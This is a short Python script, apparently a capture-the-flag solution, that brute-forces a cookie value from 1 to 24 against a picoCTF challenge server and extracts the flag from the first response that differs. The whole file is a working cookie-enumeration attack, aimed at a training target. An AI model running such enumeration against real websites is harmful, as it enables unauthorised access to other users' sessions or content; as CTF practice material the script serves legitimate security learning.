import requests
import re
from pwn import *

log.progress("Kindly allow sometime to pwn the flag")
for i in range(1,25):
    cookies = {"name" : str(i)}
    web = "http://mercury.picoctf.net:29649/"
    response = requests.get(web, cookies=cookies).text
    if "I love" in response:
        pass
    else:
        flag = re.findall("<code>(.*)</code></p>", response)
        print("Correct cookie value is " + str(i) + ", And the flag is " + "".join(flag))
        break
